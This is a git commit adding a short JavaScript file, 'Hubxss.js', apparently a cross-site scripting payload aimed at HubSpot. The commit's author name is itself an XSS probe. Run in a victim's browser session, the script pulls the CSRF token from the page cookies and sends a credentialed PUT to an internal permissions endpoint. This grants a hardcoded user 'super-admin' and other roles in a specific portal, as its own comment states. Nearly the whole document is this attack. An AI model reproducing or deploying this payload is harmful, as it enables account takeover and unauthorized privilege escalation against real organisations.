7c9af5454d6ce54e864d2a2bcfe62e0338df18a4
img/src/onerror=alert('USERB') <107826115+asuspctow@users.noreply.github.com>
2024-08-07 21:20:13 +0300

    Create Hubxss.js

---
+++ Hubxss.js
@@ -0,0 +1,20 @@
+async function sendPostRequest(urlexploit, data) {
+  try {
+ 
+    const postResponse = await fetch(urlexploit, {
+      method: 'PUT',
+      credentials: 'include', // Include cookies in the request
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Hubspot-Csrf-Hubspotapi': document.cookie.split('; ').find(row => row.startsWith('csrf.app=')).split('=').slice(1).join('=');
+      },
+      body: data
+    });
+  } catch (error) {
+  }
+}
+//  urlexploit
+const urlexploit = '/api/app-users/v1/users/permissions-and-seats/bulk?portalId=145163544&clienttimeout=14000&hs_static_app=settings-ui-users&hs_static_app_version=1.43907';
+//chnage user to super admin 
+const data = '[{"userId":69507389,"roles":["sequences-write","sales-pro","sequences-bulk-enroll-write","super-admin","core-seat-base"],"seatNames":["core","sales-pro-trial"]}]';
+sendPostRequest(urlexploit, data);
